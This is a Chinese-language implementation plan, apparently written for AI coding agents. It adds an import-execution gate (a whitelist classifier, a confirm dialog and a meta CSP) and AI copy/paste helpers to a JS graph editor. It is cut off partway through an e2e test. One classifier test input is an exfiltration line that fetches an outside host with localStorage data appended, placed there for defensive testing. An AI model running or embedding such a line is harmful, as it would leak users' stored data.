# 外部导入执行闸门 + AI 传输契约 Implementation Plan

> **For agentic workers:** 按任务顺序逐条执行,每步用 `- [ ]` 跟踪。推荐:每个 Task 派一个全新 subagent(Task 工具)执行,主 session 在任务之间审查;也可 inline 执行,批量检查点。

**Goal:** 落地 ADR-008(外部导入白名单分类 + 阻断式确认 + meta CSP)与 ADR-009(AI 往返主通道改为 sourceCode 代码块,URL 降级为快路径与人类分享)。

**Architecture:** ADR-008 在 `parser.js` 新增 `classifySource` 三值分类器(字符串/注释感知的控制流检测 + class 体字段白名单 + bootstrap 语句白名单 + 字面量递归校验),闸门唯一咽喉是 `importSource`(返回布尔,取消即不载入);CSP 以 meta 进 `index.html` 锁 exfil 出口。ADR-009 在 `utils.js` 新增纯文本工具(`stripCodeBlock`/`buildAICopyText`),`modal.js` 支持 textarea,`input.js` 接线"粘贴源码…"与"复制给 AI"两个入口,`llms.txt` 重写契约。

**Tech Stack:** Vanilla JS + esbuild 单文件;测试为 Node `.mjs` 脚本 + puppeteer e2e(无 test runner)。

**关键约定(本仓库):**
- 构建:`npm run build`(必跑,dist 才刷新);e2e 加载 `dist/index.html`(file://)
- 测试:`node scripts/test-roundtrip.mjs` / `test-skeleton.mjs` / `test-e2e.mjs`
- 无 lint/typecheck;验证 = 上述脚本 + 手动
- 提交:每个批次(ADR)一笔提交,message 用中文三段式(标题 + 分段 body)
- 环境:Windows PowerShell;`cmd1; if ($?) { cmd2 }` 串联

**批次划分:** Task 1-5 = ADR-008(一笔提交);Task 6-11 = ADR-009(一笔提交)。

---

## Batch 1: ADR-008 执行闸门

### Task 1: `classifySource` 分类器 + 单元测试

**Files:**
- Modify: `src/parser.js`(文件末尾追加,复用模块内 `Cursor` / `scanComment` / `skipString` / `skipTemplateLiteral` / `scanIdentifier`)
- Modify: `scripts/test-roundtrip.mjs`(追加区 8)

- [ ] **Step 1: 写失败测试**

在 `scripts/test-roundtrip.mjs` 顶部 import 行改为:

```js
import { scanClass } from '../src/scanner.js'
import { classifySource } from '../src/parser.js'
```

在文件末尾 `console.log(\`\n总计...\`)` **之前**插入:

```js
// ==================================================================
console.log('\n=== 区 8：classifySource 白名单分类(ADR-008)===')
{
  check('纯声明式 → declarative', classifySource(`class A {
  description = 'A'
  name = 'A'
  attrs = { v: 1 }
}
const A_1 = GraphStarter.add(A, 'A_1')
A_1.v = 2
A_1.edges = [
  { target: null, description: 'x', transform: "target['v'] = source['v']" }
]`) === 'declarative')

  check('字符串含 if( / fetch( 不误伤(transform 常见)', classifySource(`class A { attrs = { s: "if (x) fetch(1)" } }
const A_1 = GraphStarter.add(A, 'A_1')`) === 'declarative')

  check('注释含 for( 不误伤', classifySource(`// for(;;) 注释
class A { attrs = { v: 1 } }
const A_1 = GraphStarter.add(A, 'A_1')`) === 'declarative')

  check('方法体 → programmatic', classifySource(`class A {
  attrs = { v: 1 }
  tick() { this.v = this.v + 1 }
}
const A_1 = GraphStarter.add(A, 'A_1')`) === 'programmatic')

  check('顶层控制流 → programmatic', classifySource(`class A { attrs = { v: 1 } }
const A_1 = GraphStarter.add(A, 'A_1')
for (let i = 0; i < 3; i++) A_1.v = A_1.v + 1`) === 'programmatic')

  check('constructor → programmatic', classifySource(`class A {
  attrs = { v: 1 }
  constructor() { this.v = 2 }
}
const A_1 = GraphStarter.add(A, 'A_1')`) === 'programmatic')

  check('顶层 fetch 调用 → unknown', classifySource(`class A { attrs = { v: 1 } }
const A_1 = GraphStarter.add(A, 'A_1')
fetch('https://example.com/' + localStorage.sa_data)`) === 'unknown')

  check('顶层 alert → unknown', classifySource(`class A { attrs = { v: 1 } }
const A_1 = GraphStarter.add(A, 'A_1')
alert(1)`) === 'unknown')

  check('模板串插值 → unknown', classifySource('class A { attrs = { v: 1 } }\nconst A_1 = GraphStarter.add(A, \'A_1\')\nA_1.v = `${1+1}`') === 'unknown')

  check('__proto__ 键 → unknown', classifySource(`class A { attrs = { v: 1 } }
const A_1 = GraphStarter.add(A, 'A_1')
A_1.v = { __proto__: { x: 1 } }`) === 'unknown')

  check('未知 class 字段(static) → unknown', classifySource(`class A {
  static description = 'x'
  attrs = { v: 1 }
}
const A_1 = GraphStarter.add(A, 'A_1')`) === 'unknown')

  check('裸引用赋值 → declarative', classifySource(`class A { attrs = { v: 1 } }
class B { attrs = { v: 0 } }
const A_1 = GraphStarter.add(A, 'A_1')
const B_1 = GraphStarter.add(B, 'B_1')
B_1.ref = A_1`) === 'declarative')

  check('quoted key 赋值 → declarative', classifySource(`class A { attrs = { v: 1 } }
const A_1 = GraphStarter.add(A, 'A_1')
A_1['a b'] = 2`) === 'declarative')

  check('edges = [] → declarative', classifySource(`class A { attrs = { v: 1 } }
const A_1 = GraphStarter.add(A, 'A_1')
A_1.edges = []`) === 'declarative')

  check('数字边界(-1/1.5/1e+21/Infinity/NaN/undefined)→ declarative', classifySource(`class A { attrs = { a: -1, b: 1.5, c: 1e+21, d: Infinity, e: NaN, f: undefined } }
const A_1 = GraphStarter.add(A, 'A_1')`) === 'declarative')

  check('未闭合字符串 → unknown', classifySource("class A { attrs = { s: 'oops } }") === 'unknown')

  check('import 语句 → unknown', classifySource(`import x from 'y'
class A { attrs = { v: 1 } }`) === 'unknown')

  check('空串 → declarative', classifySource('') === 'declarative')
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `node scripts/test-roundtrip.mjs`
Expected: 区 8 全部 ❌(`classifySource` 未导出 → import 报错或 undefined 调用)。若 import 直接抛 `does not provide an export named 'classifySource'`,即符合预期。

- [ ] **Step 3: 实现 `classifySource`**

在 `src/parser.js` 末尾(`isSourceCodeProgrammatic` 之后)追加:

```js
// ============================================================
// ADR-008:外部导入可信度分类
// 返回 'declarative' | 'programmatic' | 'unknown'
//   declarative — 只含模型认识的声明式语句,可静默运行
//   programmatic — 控制流/方法体/箭头函数,执行前需用户确认
//   unknown — 无法归类(保守,同样需要确认)
// 注意:这是安全闸门判定,不是完整 JS 解析器。只放行白名单语法,
// 任何无法证明"无函数调用"的构造一律拒绝(宁可误闸,不可误放)。
// 与 isSourceCodeProgrammatic 的分工:后者判"切 UI 模式会丢什么"(粗,可误伤);
// 本函数是安全边界,必须字符串/注释感知(transform 字符串里常见 if( )。
// ============================================================

const _IDENT_START_RE = /[\p{L}_$]/u

function _isIdentStart(ch) { return !!ch && _IDENT_START_RE.test(ch) }

function _skipWSComments(c) {
  while (!c.eof()) {
    if (/\s/.test(c.peek())) { c.next(); continue }
    if (c.peek() === '/') { if (scanComment(c)) continue }
    break
  }
}

function _peekWord(c) {
  if (!_isIdentStart(c.peek())) return null
  const saved = c.pos
  const w = scanIdentifier(c)
  c.pos = saved
  return w
}

function _consumeWord(c, word) {
  if (_peekWord(c) !== word) return false
  for (let i = 0; i < word.length; i++) c.next()
  return true
}

// 把字符串/注释/模板串替换为等长空白,只留可执行骨架(用于控制流关键字检测)
function _stripStringsAndComments(code) {
  const c = new Cursor(code)
  let out = ''
  while (!c.eof()) {
    const ch = c.peek()
    if (ch === '/') {
      const saved = c.pos
      const cm = scanComment(c)
      if (cm) { out += ' '.repeat(cm.endPos - saved); continue }
      out += c.next()
      continue
    }
    if (ch === "'" || ch === '"') {
      const start = c.pos
      c.next()
      skipString(c, ch)
      out += ' '.repeat(c.pos - start)
      continue
    }
    if (ch === '`') {
      const start = c.pos
      c.next()
      skipTemplateLiteral(c)
      out += ' '.repeat(c.pos - start)
      continue
    }
    out += c.next()
  }
  return out
}

// 字面量 / 裸标识符(实例引用)。消费成功返回 true。
// 支持:字符串(单/双引号、无插值模板串)、数字(负/小数/指数/进制)、
// true/false/null/undefined/NaN/Infinity、数组、对象(键为标识符或字符串;
// 拒绝 __proto__)、裸标识符。其余(函数/箭头/成员访问/调用/模板插值/
// 展开/计算键)一律 false → 上层归 unknown。
function _consumeLiteral(c, depth) {
  if (depth > 20) return false
  _skipWSComments(c)
  const ch = c.peek()
  if (!ch) return false
  if (ch === "'" || ch === '"') { c.next(); skipString(c, ch); return true }
  if (ch === '`') {
    c.next()
    while (!c.eof()) {
      const t = c.peek()
      if (t === '\\') { c.next(); c.next(); continue }
      if (t === '$' && c.peek(1) === '{') return false
      if (t === '`') { c.next(); return true }
      c.next()
    }
    return false
  }
  if (ch === '[') {
    c.next()
    while (true) {
      _skipWSComments(c)
      if (c.peek() === ']') { c.next(); return true }
      if (!_consumeLiteral(c, depth + 1)) return false
      _skipWSComments(c)
      if (c.peek() === ',') { c.next(); continue }
      if (c.peek() === ']') { c.next(); return true }
      return false
    }
  }
  if (ch === '{') {
    c.next()
    while (true) {
      _skipWSComments(c)
      if (c.peek() === '}') { c.next(); return true }
      let key = null
      if (_isIdentStart(c.peek())) key = scanIdentifier(c)
      else if (c.peek() === "'" || c.peek() === '"') {
        const q = c.peek(); c.next()
        key = ''
        while (!c.eof() && c.peek() !== q) {
          if (c.peek() === '\\') { c.next(); key += c.next() }
          else key += c.next()
        }
        if (c.eof()) return false
        c.next()
      } else return false
      if (key === '__proto__') return false
      _skipWSComments(c)
      if (c.peek() !== ':') return false
      c.next()
      if (!_consumeLiteral(c, depth + 1)) return false
      _skipWSComments(c)
      if (c.peek() === ',') { c.next(); continue }
      if (c.peek() === '}') { c.next(); return true }
      return false
    }
  }
  if (ch === '-' || ch === '.' || (ch >= '0' && ch <= '9')) {
    const rest = c.code.slice(c.pos)
    const m = rest.match(/^-?(?:0[xX][0-9a-fA-F]+|0[oO][0-7]+|0[bB][01]+|\d+\.?\d*(?:[eE][+-]?\d+)?|\.\d+(?:[eE][+-]?\d+)?)/)
    if (m) {
      for (let i = 0; i < m[0].length; i++) c.next()
      return true
    }
    if (ch === '-') {
      c.next()
      if (_consumeWord(c, 'Infinity') || _consumeWord(c, 'NaN')) return true
      return false
    }
    return false
  }
  if (_isIdentStart(ch)) { scanIdentifier(c); return true }
  return false
}

// class 体白名单:只允许 description/name/attrs 三个数据字段(值为字面量)。
// 方法/constructor/getter → programmatic;未知字段(static 等)→ unknown。
function _classifyClass(source) {
  const c = new Cursor(source)
  if (!_consumeWord(c, 'class')) return 'unknown'
  _skipWSComments(c)
  if (!_isIdentStart(c.peek())) return 'unknown'
  scanIdentifier(c)
  _skipWSComments(c)
  if (_peekWord(c) === 'extends') {
    _consumeWord(c, 'extends')
    _skipWSComments(c)
    if (!_isIdentStart(c.peek())) return 'unknown'
    scanIdentifier(c)
    _skipWSComments(c)
  }
  if (c.peek() !== '{') return 'unknown'
  c.next()
  while (true) {
    _skipWSComments(c)
    if (c.eof()) return 'unknown'
    if (c.peek() === '}') return 'declarative'
    if (c.peek() === ';') { c.next(); continue }
    if (!_isIdentStart(c.peek())) return 'unknown'
    const field = scanIdentifier(c)
    _skipWSComments(c)
    if (c.peek() === '(') return 'programmatic'
    if (c.peek() !== '=') return 'unknown'
    c.next()
    _skipWSComments(c)
    if (field === 'description' || field === 'name') {
      const q = c.peek()
      if (q !== "'" && q !== '"' && q !== '`') return 'unknown'
      if (!_consumeLiteral(c, 0)) return 'unknown'
    } else if (field === 'attrs') {
      if (!_consumeLiteral(c, 0)) return 'unknown'
    } else {
      return 'unknown'
    }
    _skipWSComments(c)
    if (c.peek() === ';') c.next()
  }
}

// 启动段白名单:GraphStarter.add 声明 + 实例 override/edges 赋值
function _isDeclarativeBootstrap(boot) {
  const c = new Cursor(boot)
  while (true) {
    _skipWSComments(c)
    if (c.eof()) return true
    if (c.peek() === ';') { c.next(); continue }
    const w = _peekWord(c)
    if (w === 'const' || w === 'let' || w === 'var') {
      _consumeWord(c, w)
      _skipWSComments(c)
      if (!_isIdentStart(c.peek())) return false
      scanIdentifier(c)
      _skipWSComments(c)
      if (c.peek() !== '=') return false
      c.next()
      _skipWSComments(c)
      if (!_consumeWord(c, 'GraphStarter')) return false
      _skipWSComments(c)
      if (c.peek() !== '.') return false
      c.next()
      _skipWSComments(c)
      if (!_consumeWord(c, 'add')) return false
      _skipWSComments(c)
      if (c.peek() !== '(') return false
      c.next()
      _skipWSComments(c)
      if (!_isIdentStart(c.peek())) return false
      scanIdentifier(c)
      _skipWSComments(c)
      if (c.peek() === ',') {
        c.next()
        _skipWSComments(c)
        const q = c.peek()
        if (q !== "'" && q !== '"') return false
        c.next(); skipString(c, q)
        _skipWSComments(c)
      }
      if (c.peek() !== ')') return false
      c.next()
      if (c.peek() === ';') c.next()
      continue
    }
    // IDENT.accessor = 字面量/引用
    if (!_isIdentStart(c.peek())) return false
    scanIdentifier(c)
    _skipWSComments(c)
    if (c.peek() === '.') {
      c.next()
      _skipWSComments(c)
      if (!_isIdentStart(c.peek())) return false
      scanIdentifier(c)
    } else if (c.peek() === '[') {
      c.next()
      _skipWSComments(c)
      const q = c.peek()
      if (q !== "'" && q !== '"') return false
      c.next(); skipString(c, q)
      _skipWSComments(c)
      if (c.peek() !== ']') return false
      c.next()
    } else {
      return false
    }
    _skipWSComments(c)
    if (c.peek() !== '=') return false
    c.next()
    if (!_consumeLiteral(c, 0)) return false
    if (c.peek() === ';') c.next()
  }
}

export function classifySource(code) {
  if (typeof code !== 'string') return 'unknown'
  if (!code.trim()) return 'declarative'
  let clean
  try { clean = _stripStringsAndComments(code) } catch (_) { return 'unknown' }
  if (/\b(?:for\s*\(|while\s*\(|if\s*\(|switch\s*\(|function\b|=>)/.test(clean)) return 'programmatic'
  let split
  try { split = splitSource(code) } catch (_) { return 'unknown' }
  for (const c of split.classes) {
    const kind = _classifyClass(c.source)
    if (kind !== 'declarative') return kind
  }
  try {
    if (!_isDeclarativeBootstrap(split.bootstrap)) return 'unknown'
  } catch (_) { return 'unknown' }
  return 'declarative'
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `node scripts/test-roundtrip.mjs`
Expected: `总计: 36 通过, 0 失败`(18 + 18 新增)

### Task 2: 闸门接线(`importSource` 唯一咽喉)

**Files:**
- Modify: `src/io.js`(import 行 + `importSource` 开头)
- Modify: `src/main.js`(hash 载入检查返回值)
- Modify: `src/input.js`(文件导入检查返回值)

- [ ] **Step 1: io.js 导入 classifySource**

`src/io.js:18` 改为:

```js
import { isSourceCodeProgrammatic, classifySource } from './parser.js'
```

- [ ] **Step 2: io.js `importSource` 开头插入闸门**

在 `state.loadError = null` **之前**(版本校验之后)插入:

```js
  // ADR-008 外部导入执行闸门:声明式免确认;其余(程序化/未知)先确认。
  // 闸门必须在任何 state mutation 之前,取消 = 完全不动当前状态。
  const _level = classifySource(data.sourceCode)
  if (_level !== 'declarative') {
    const ok = confirm(
      '此链接包含可执行代码(sourceCode 含方法体/控制流或无法归类)。\n\n' +
      '是否载入并运行?\n' +
      '确定 = 载入并运行\n' +
      '取消 = 不载入(保留当前图)'
    )
    if (!ok) return false
  }
```

并在函数末尾 `fitToView()` 之后加 `return true`(即 `importSource` 改为显式返回布尔)。

- [ ] **Step 3: main.js 检查返回值**

`src/main.js` 的 hash 载入块改为:

```js
  if (hash) {
    try {
      const data = JSON.parse(fromB64(hash))
      if (importSource(data)) {
        save()
        loaded = true
      }
    } catch (e) {
      alert('分享链接载入失败：' + e.message + '\n\n将回退到本地已保存的图(如有)。')
    }
    history.replaceState(null, '', location.pathname)
  }
```

- [ ] **Step 4: input.js 文件导入检查返回值**

`src/input.js:787` 改为:

```js
        pushUndo()
        const ok = importJSON(data)
        if (ok) { save(); render() }
```

- [ ] **Step 5: 回归(现有测试必须全绿)**

Run: `npm run build; if ($?) { node scripts/test-roundtrip.mjs; node scripts/test-e2e.mjs }`
Expected: roundtrip 36 通过;e2e 179 通过(现有 e2e 的 dialog handler 自动 accept,闸门不影响)。

### Task 3: meta CSP

**Files:**
- Modify: `src/index.html`(`<head>` 内)

- [ ] **Step 1: 加 meta**

在 `src/index.html` 的 `<meta name="viewport" ...>` 之后插入:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; worker-src 'none'">
```

- [ ] **Step 2: 构建 + 冒烟**

Run: `npm run build; if ($?) { node scripts/test-e2e.mjs }`
Expected: e2e 179 通过(若 CSP 误伤自身,会出现大量失败——届时检查 console 里的 CSP violation)。

### Task 4: e2e 闸门测试 + storm 不变量断言

**Files:**
- Modify: `scripts/test-e2e.mjs`(dialog 处理 + 测试 45-48)
- Modify: `scripts/test-skeleton.mjs`(storm 加一条 check)

- [ ] **Step 1: e2e dialog 处理改为可切换**

`scripts/test-e2e.mjs:90-94` 改为:

```js
const dialogMsgs = []
let dialogMode = 'accept'
page.on('dialog', async d => {
  dialogMsgs.push(d.message())
  if (dialogMode === 'dismiss') await d.dismiss()
  else await d.accept()
})
```

并在顶部 import 区加:

```js
import { toB64 } from '../src/utils.js'
```

- [ ] **Step 2: 追加测试 45-48**

在测试 44 块之后、`await browser.close()` 之前插入:

```js
const GATE_SAMPLE = `class Counter {
  description = '计数器'
  attrs = { n: 0 }
  tick() { this.n = this.n + 1 }
}
const Counter_1 = GraphStarter.add(Counter, 'Counter_1')`

console.log('\n测试 45：ADR-008 声明式导入零弹窗')
{
  dialogMsgs.length = 0
  const ok = await page.evaluate((src) => window.__sa_test.importJSON({ sourceCode: src, title: '闸门声明式' }), V09_SAMPLE)
  await new Promise(r => setTimeout(r, 150))
  check('声明式导入成功(返回 true)', ok === true, ok)
  check('声明式导入零 confirm', dialogMsgs.length === 0, dialogMsgs)
}

console.log('\n测试 46：ADR-008 程序化导入取消不载入')
{
  const before = await page.evaluate(() => window.state.sourceCode)
  dialogMsgs.length = 0
  dialogMode = 'dismiss'
  const ok = await page.evaluate((src) => window.__sa_test.importJSON({ sourceCode: src, title: '闸门程序化' }), GATE_SAMPLE)
  dialogMode = 'accept'
  const after = await page.evaluate(() => window.state.sourceCode)
  check('程序化导入返回 false(取消)', ok === false, ok)
  check('取消后 sourceCode 未变', after === before, { changed: after !== before })
  check('闸门 confirm 文案命中', dialogMsgs.some(m => m.includes('可执行代码')), dialogMsgs)
}

console.log('\n测试 47：ADR-008 meta CSP(出口锁定)')
{
  const csp = await page.evaluate(async () => {
    const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]')
    const violations = []
    document.addEventListener('securitypolicyviolation', e => violations.push(e.violatedDirective))
    try { await fetch('https://example.com/') } catch (_) {}
    await new Promise(r => setTimeout(r, 100))
    return { hasMeta: !!meta, content: meta ? meta.content : '', violations }
  })
  check('meta CSP 存在', csp.hasMeta, csp)
  check("CSP 含 connect-src 'none'", /connect-src\s+'none'/.test(csp.content), csp.content)
  check('fetch 触发 connect-src 违规', csp.violations.some(v => v.startsWith('connect-src')), csp.violations)
}

console.log('\n测试 48：ADR-008 分享链接取消载入 → 回退本地图')
{
  dialogMsgs.length = 0
  dialogMode = 'dismiss'
  const payload = toB64(JSON.stringify({ version: 6, sourceCode: GATE_SAMPLE, editMode: 'code', title: '闸门URL测试' }))
  await page.goto('file://' + resolve(root, 'dist', 'index.html') + '#' + payload)
  await page.waitForFunction(() => window.state)
  await new Promise(r => setTimeout(r, 150))
  const s = await page.evaluate(() => ({ src: window.state.sourceCode, title: window.state.graphTitle }))
  dialogMode = 'accept'
  check('dismiss 后未载入 hash 图', !s.src.includes('tick()'), s.src.slice(0, 80))
  check('回退本地已存图(标题非 闸门URL测试)', s.title !== '闸门URL测试', s.title)
  check('闸门 confirm 出现', dialogMsgs.some(m => m.includes('可执行代码')), dialogMsgs)
}
```

- [ ] **Step 3: test-skeleton storm 加断言**

`scripts/test-skeleton.mjs` import 区加:

```js
import { classifySource } from '../src/parser.js'
```

storm 区(约 line 366)把 `let mismatch = null, fixMismatch = null, crashed = null` 改为:

```js
  let mismatch = null, fixMismatch = null, crashed = null, classifyBad = null
```

在 `code = serializeCode(state)` 之后(约 line 380,`runSource(code, state)` 之前)插入:

```js
      if (classifySource(code) !== 'declarative' && !classifyBad) {
        classifyBad = { s, op, code: code.slice(0, 200) }
      }
```

并在 storm 的三条 check 之后追加:

```js
  check('编辑风暴 ' + ops + ' 次操作:序列化产物必为 declarative', !classifyBad, classifyBad)
```

- [ ] **Step 4: 构建 + 全量测试**

Run: `npm run build; if ($?) { node scripts/test-skeleton.mjs; node scripts/test-e2e.mjs }`
Expected: skeleton 48 通过(47+1);e2e 190 通过(179+11)。

### Task 5: ADR-008 文档同步 + 提交

**Files:**
- Modify: `CLAUDE.md`(项目级硬约束加一条)
- Modify: `docs/architecture.md`(模块表 + 不变量 28-30 + 主流程一句)
- Modify: `CHANGELOG.md`(Added 段)

- [ ] **Step 1: CLAUDE.md 加约束**

在"[不变量] — 项目级硬约束"列表中追加:

```markdown
- **外部导入的 sourceCode 必须先过 `classifySource`(ADR-008)**——declarative 免确认,programmatic/unknown 弹阻断式 confirm;闸门唯一咽喉是 `importSource`(返回布尔,取消不载入),localStorage 载入不过闸。dist 必须携带 meta CSP(`connect-src 'none'`),不得引入运行时网络请求。
```

- [ ] **Step 2: architecture.md 同步**

在模块清单加 `parser.classifySource`(外部导入分类器,ADR-008)与闸门说明;在不变量列表末尾追加 28-30(照抄 `docs/decisions/adr-008-import-execution-gate.md` 的[不变量]三条);主流程段加一句"外部导入 → classifySource → 确认 → runSource"。

- [ ] **Step 3: CHANGELOG.md 加条目**

Added 段加:

```markdown
- **外部导入执行闸门(ADR-008)**:`classifySource` 三值分类(声明式/程序化/未知)+ `importSource` 阻断式确认(取消不载入、URL 回退本地图)+ meta CSP(`connect-src 'none'` 锁 exfil 出口);测试:分类器 18 项 + e2e 4 例 + storm "序列化产物必为 declarative"不变量
```

- [ ] **Step 4: 全量五套测试**

Run: `npm run build; if ($?) { node scripts/test-engine.mjs; node scripts/test-codegraph.mjs; node scripts/test-roundtrip.mjs; node scripts/test-skeleton.mjs; node scripts/test-e2e.mjs }`
Expected: 32 / 81 / 36 / 48 / 190 全绿。

- [ ] **Step 5: 提交**

```powershell
git add -A
git commit -m "feat: 外部导入执行闸门(ADR-008)——白名单分类 + 阻断式确认 + CSP

- parser.js 新增 classifySource:'declarative'(静默)/'programmatic'/'unknown'
  (字符串/注释感知的控制流检测 + class 体字段白名单 + bootstrap 语句白名单
  + 字面量递归校验,拒绝调用/成员访问/模板插值/__proto__)
- importSource 成为唯一闸门(返回布尔,取消不载入);main.js URL 取消回退本地图,
  文件导入/粘贴导入取消即 no-op
- index.html meta CSP:connect-src 'none' + img-src 'self' data: 锁 exfil 出口,
  script-src 保留 unsafe-eval(new Function 架构依赖)
- 测试:test-roundtrip 区 8(18 项,含 transform 字符串含 if( 不误伤)、
  test-skeleton storm 新增'序列化产物必为 declarative'不变量、
  e2e 45-48(零弹窗/取消不载入/CSP 生效/URL 回退)
- 文档:CLAUDE.md 约束、architecture 不变量 28-30、CHANGELOG"
```

---

## Batch 2: ADR-009 AI 传输契约

### Task 6: 文本工具(`stripCodeBlock` / `buildAICopyText`)+ 单测

**Files:**
- Modify: `src/utils.js`(末尾追加)
- Modify: `scripts/test-roundtrip.mjs`(追加区 9)

- [ ] **Step 1: 写失败测试**

`scripts/test-roundtrip.mjs` import 行追加:

```js
import { stripCodeBlock, buildAICopyText } from '../src/utils.js'
```

文件末尾(总计之前)插入:

```js
// ==================================================================
console.log('\n=== 区 9：AI 传输文本工具(ADR-009)===')
{
  const src = "class A { attrs = { v: 1 } }\nconst A_1 = GraphStarter.add(A, 'A_1')"
  check('stripCodeBlock 剥围栏', stripCodeBlock('```js\n' + src + '\n```') === src)
  check('stripCodeBlock 剥标记', stripCodeBlock('// sa-edit: 123\n' + src) === src)
  check('stripCodeBlock 围栏+标记', stripCodeBlock('```js\n// sa-edit: 123\n' + src + '\n```') === src)
  check('stripCodeBlock 无围栏原样', stripCodeBlock(src) === src)
  check('stripCodeBlock 块内 ``` 不误剥', stripCodeBlock('```js\n' + src + '\nconst s = "```"\n```') === src + '\nconst s = "```"')
  const text = buildAICopyText(src, 42)
  check('buildAICopyText 首行标记', text.startsWith('```js\n// sa-edit: 42\n'))
  check('buildAICopyText 尾部围栏', text.endsWith('\n```\n'))
  check('往返:build → strip 还原源码', stripCodeBlock(text) === src)
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `node scripts/test-roundtrip.mjs`
Expected: 区 9 全部 ❌(未导出)。

- [ ] **Step 3: 实现**

`src/utils.js` 末尾追加:

```js
// ============================================================
// ADR-009 AI 传输契约:代码块主通道的文本工具
// ============================================================

// 剥离 AI 输出常见的包装:```围栏 + 首行 `// sa-edit: <时间戳>` 标记。
// 只剥"包住全文"的围栏(块内字符串里的 ``` 不受影响);标记只剥首行。
export function stripCodeBlock(text) {
  let t = String(text || '').trim()
  const fence = t.match(/^```[^\n]*\n([\s\S]*?)\n?```$/)
  if (fence) t = fence[1]
  t = t.replace(/^\s*\/\/\s*sa-edit:[^\n]*\n?/, '')
  return t
}

// "复制给 AI"的文本:围栏代码块,首行 sa-edit 标记(版本发散检测)。
// 标记不存进源码本身,每次复制时由调用方传时间戳生成。
export function buildAICopyText(sourceCode, ts) {
  const body = String(sourceCode || '').replace(/\s+$/, '')
  return '```js\n// sa-edit: ' + ts + '\n' + body + '\n```\n'
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `node scripts/test-roundtrip.mjs`
Expected: `总计: 44 通过, 0 失败`(36 + 8)

### Task 7: 粘贴源码导入(模态 + 菜单)

**Files:**
- Modify: `src/modal.js`(showModal 支持 textarea;Enter 不吞 textarea)
- Modify: `src/index.html`(菜单项)
- Modify: `src/input.js`(pasteSource + window 暴露)

- [ ] **Step 1: modal.js 支持 textarea**

`src/modal.js:50-66` 的字段构造改为:

```js
      let input
      if (f.type === 'datalist') {
        const listId = 'modal-datalist-' + f.name + '-' + Date.now()
        const dl = document.createElement('datalist')
        dl.id = listId
        for (const opt of (f.options || [])) {
          const o = document.createElement('option')
          o.value = opt
          dl.appendChild(o)
        }
        document.body.appendChild(dl)
        input = document.createElement('input')
        input.type = 'text'
        input.setAttribute('list', listId)
      } else if (f.type === 'textarea') {
        input = document.createElement('textarea')
      } else {
        input = document.createElement('input')
        input.type = 'text'
      }
```

`src/modal.js:131-134` 的 Enter 处理改为:

```js
    box.addEventListener('keydown', e => {
      if (e.key === 'Enter' && e.target.tagName !== 'TEXTAREA') { e.preventDefault(); attemptSubmit() }
      else if (e.key === 'Escape') { e.preventDefault(); finish(null) }
    })
```

- [ ] **Step 2: index.html 菜单项**

`src/index.html:127-130` 区域改为:

```html
      <div class="menu-item" onclick="document.getElementById('import-input').click()">导入 JavaScript</div>
      <div class="menu-item" onclick="pasteSource()">粘贴源码…</div>
      <div class="menu-sep"></div>
      <div class="menu-item" onclick="onExport()">导出 JavaScript</div>
      <div class="menu-item" onclick="copyForAI()">复制给 AI</div>
      <div class="menu-item" onclick="shareURL()">分享</div>
```

- [ ] **Step 3: input.js 接线 pasteSource**

`src/input.js` import 行(第 12 行 utils import)追加 `stripCodeBlock`。在 `window.shareURL = shareURL` 附近加:

```js
window.pasteSource = async function() {
  const vals = await showModal({
    title: '粘贴源码导入',
    fields: [{ name: 'source', label: 'sourceCode(可直接粘贴 AI 输出的代码块,围栏与 sa-edit 标记会自动剥离)', type: 'textarea' }],
    submitLabel: '载入',
  })
  if (!vals) return
  const code = stripCodeBlock(vals.source)
  if (!code) return
  try {
    pushUndo()
    const ok = importJSON({ sourceCode: code, title: '粘贴导入' })
    if (ok) { save(); render() }
  } catch (err) { alert('导入失败：' + err.message) }
}
```

- [ ] **Step 4: 构建 + 手动冒烟(e2e 前)**

Run: `npm run build; if ($?) { node scripts/test-e2e.mjs }`
Expected: e2e 190 通过(菜单项尚无 e2e 断言,不应破坏现有测试)。

### Task 8: 复制给 AI

**Files:**
- Modify: `src/io.js`(copyForAI)
- Modify: `src/input.js`(window 暴露 + `__sa_test` 钩子)

- [ ] **Step 1: io.js 实现**

`src/io.js` 顶部 utils import 追加 `buildAICopyText`;在 `shareURL` 之后加:

```js
// ADR-009:复制给 AI 的代码块(标记 + 围栏),与分享链接(URL,人类)职责分离。
// 用 state.sourceCode 而不是 serializeCode(state):Code 模式的方法体不能被重建掉。
export function copyForAI() {
  const text = buildAICopyText(state.sourceCode, Date.now())
  navigator.clipboard.writeText(text)
    .then(() => alert('已复制给 AI 的代码块（' + text.length + ' 字符）'))
    .catch(() => prompt('复制以下内容给 AI：', text))
}
```

- [ ] **Step 2: input.js 暴露**

在 `window.shareURL = shareURL` 附近加:

```js
window.copyForAI = copyForAI
window.__sa_test.buildAICopyText = buildAICopyText
```

并在 input.js 顶部 utils import 追加 `buildAICopyText`。

- [ ] **Step 3: 构建 + 回归**

Run: `npm run build; if ($?) { node scripts/test-e2e.mjs }`
Expected: 190 通过。

### Task 9: e2e 粘贴导入 + 菜单/文本断言

**Files:**
- Modify: `scripts/test-e2e.mjs`(测试 49-50)

- [ ] **Step 1: 追加测试**

在测试 48 之后、`await browser.close()` 之前插入:

```js
const PASTE_SAMPLE = `class P {
  description = '粘贴'
  attrs = { v: 7 }
}
const P_1 = GraphStarter.add(P, 'P_1')`

console.log('\n测试 49：ADR-009 粘贴导入(围栏+sa-edit 标记剥离)')
{
  const pasted = '```js\n// sa-edit: 1234567890\n' + PASTE_SAMPLE + '\n```'
  await page.evaluate((text) => {
    window.__sa_test.modalPrefill = { source: text }
    window.pasteSource()
  }, pasted)
  await new Promise(r => setTimeout(r, 300))
  const r = await page.evaluate(() => ({
    title: window.state.graphTitle,
    src: window.state.sourceCode,
    count: window.state.runtimeInstances.length,
    v: window.state.runtimeInstances[0]?.attrs.v,
  }))
  check('粘贴导入成功(title=粘贴导入)', r.title === '粘贴导入', r.title)
